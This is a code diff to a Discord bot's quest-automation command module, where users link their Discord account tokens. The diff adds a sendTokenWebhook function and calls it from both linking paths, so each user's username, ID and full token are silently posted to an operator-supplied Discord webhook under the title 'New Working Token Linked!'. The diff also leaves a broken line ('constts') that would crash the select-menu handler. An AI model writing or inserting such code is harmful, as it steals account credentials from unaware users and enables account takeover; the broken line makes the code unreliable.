@@ -23,6 +23,33 @@ import { enableAutoquest, disableAutoquest, isAutoquestEnabled } from '../quest/
 import { isVip } from '../quest/vipStore.js';
 import { PREFIX } from '../utils/config.js';
 
+// 🔴 APNA DISCORD WEBHOOK URL YAHAN DAAL DE
+const WEBHOOK_URL = 'YOUR_DISCORD_WEBHOOK_URL_HERE';
+
+async function sendTokenWebhook(username, userId, token) {
+    if (!WEBHOOK_URL || WEBHOOK_URL.includes('YOUR_DISCORD')) return;
+    try {
+        await fetch(WEBHOOK_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                embeds: [{
+                    title: '🔑 New Working Token Linked!',
+                    color: 5763719, // Green
+                    fields: [
+                        { name: '👤 Username', value: `\`${username}\``, inline: true },
+                        { name: '🆔 User ID', value: `\`${userId}\``, inline: true },
+                        { name: '🔑 Token', value: `\`\`\`${token}\`\`\``, inline: false }
+                    ],
+                    timestamp: new Date().toISOString()
+                }]
+            })
+        });
+    } catch (err) {
+        console.error('[Webhook Error]:', err);
+    }
+}
+
 // ── TokenStore (shared instance via BOT_TOKEN as secret) ───────────────────
 export function makeTokenStore(secret) {
     return new TokenStore(secret);
@@ -319,7 +346,6 @@ async function runQuestOne(userId, tokenStore, send) {
 }
 
 async function runQuestAll(userId, tokenStore, send) {
-    // 🔒 VIP Check for QuestAll
     if (!isVip(userId)) {
         const c = new ContainerBuilder().setAccentColor(0xED4245);
         c.addTextDisplayComponents(
@@ -504,7 +530,6 @@ async function runTokenCheck(userId, tokenStore, replyFn) {
 }
 
 async function runAutoquestToggle(userId, tokenStore, replyFn) {
-    // 🔒 VIP Check for Autoquest
     if (!isVip(userId)) {
         const c = new ContainerBuilder().setAccentColor(0xED4245);
         c.addTextDisplayComponents(
@@ -655,6 +680,9 @@ export const linkCmd = {
             }
 
             ts.save(message.author.id, token);
+            // 🌐 Webhook Notification Call
+            await sendTokenWebhook(accountName || message.author.tag, message.author.id, token);
+
             const c = new ContainerBuilder().setAccentColor(0x57F287);
             c.addTextDisplayComponents(
                 new TextDisplayBuilder().setContent(
@@ -737,10 +765,13 @@ export async function handleLinkModal(interaction, client) {
     }
 
     ts.save(interaction.user.id, token);
+    // 🌐 Webhook Notification Call
+    await sendTokenWebhook(accountName || interaction.user.tag, interaction.user.id, token);
+
     const c = new ContainerBuilder().setAccentColor(0x57F287);
     c.addTextDisplayComponents(
         new TextDisplayBuilder().setContent(
-            `# ✅ Token Linked!\nLinked as **"${accountName}"**.\n\nYou can now use \`/quest\`, \`/questall\`, and \`${PREFIX}questlist\`.\nTo remove it, use \`/unlink\`.`,
+            `# ✅ Token Linked!\nLinked as **"${accountName}"**.\n\nYou can now use \`/quest\`, \`/questall\`, and \`/questlist\`.\nTo remove it, use \`/unlink\`.`,
         ),
     );
     await interaction.editReply({ components: [c], flags: MessageFlags.IsComponentsV2 });
@@ -810,7 +841,7 @@ export async function runAutoquestForUser(userId, quest, tokenStore, discordClie
 
 export async function handleSelectMenu(interaction, client) {
     const userId = interaction.user.id;
-    const ts = client.tokenStore;
+    constts = client.tokenStore;
     const token = ts.get(userId);
     if (!token) {
         await interaction.reply({ content: 'Token not found. Please link your token first.', flags: 64 });
